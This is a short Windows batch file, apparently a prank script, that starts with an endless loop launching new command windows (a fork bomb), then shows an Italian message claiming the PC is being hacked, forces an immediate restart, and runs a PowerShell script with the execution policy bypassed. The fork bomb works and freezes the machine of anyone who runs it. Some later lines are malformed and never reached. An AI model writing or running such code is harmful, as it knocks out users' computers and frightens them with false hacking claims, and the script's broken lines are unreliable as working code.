@echo off
:crash
start
goto crash
*msg "Il tuo pc sta per essere hakerato"
stop
shutdown /r /t 0

echo Computer riavviato. Premi OK per continuare.
pause >nul

powershell -ExecutionPolicy Bypass -File "avvia_video.ps1"
